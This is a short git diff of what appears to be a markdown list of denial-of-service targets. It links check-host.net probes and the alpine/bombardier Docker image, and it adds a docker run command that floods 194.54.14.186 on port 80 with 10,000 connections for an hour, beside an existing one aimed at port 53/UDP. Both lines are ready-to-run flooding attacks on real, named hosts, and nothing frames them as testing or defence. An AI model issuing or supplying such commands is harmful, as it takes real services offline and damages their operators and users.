@@ -66,6 +66,7 @@ https://check-host.net/check-udp?host=194.54.14.187
 https://hub.docker.com/r/alpine/bombardier
 
 ```
+docker run -ti --rm alpine/bombardier -c 10000 -d 3600s -l 194.54.14.186:80
 docker run -ti --rm alpine/bombardier -c 10000 -d 3600s -l 194.54.14.186:53/UDP
 ```
 
